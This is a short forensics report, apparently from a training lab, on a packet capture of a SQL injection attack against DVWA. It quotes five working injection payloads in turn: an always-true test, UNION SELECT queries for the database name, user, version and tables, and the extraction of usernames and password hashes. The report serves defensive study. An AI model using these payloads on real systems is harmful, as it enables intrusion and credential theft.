# SQL Injection Attack Forensics Report

**Capture File:** SQL_Lab.pcap
**Attack Duration:** 441.807206s
**Attacker IP:** 10.0.2.4
**Target IP:** 10.0.2.15
**Date Analyzed:** 17.02.2026
**Analyst:** Maftuna

---

## Attack Timeline

### Phase 1: Vulnerability Probing (Packet 13)
**Time:** 0:00
**Payload:** `1=1`
**Technique:** Always true condition test
**Result:** Application returned database record instead of error
**Significance:** ✅ Confirmed SQL injection vulnerability

### Phase 2: Database Fingerprinting (Packet 19)
**Payload:** `1' or 1=1 union select database(), user()#`
**Information Gained:**
- Database Name: `dvwa`
- Database User: `root@localhost`
- Multiple user accounts exposed

### Phase 3: Version Enumeration (Packet 22)
**Payload:** `1' or 1=1 union select null, version()#`
**Information Gained:**
- MySQL Version: 5.7.12-0

### Phase 4: Table Enumeration (Packet 25)
**Payload:** `1'or 1=1 union select null, table_name from information_schema.tables#`
**Information Gained:**
- Complete list of all database tables
- Particularly interested in `users` table

### Phase 5: Data Exfiltration (Packet 28)
**Payload:** `1'or 1=1 union select user, password from users#`
**Information Gained:**
- Usernames and password hashes
- **CRITICAL DATA BREACH**

---

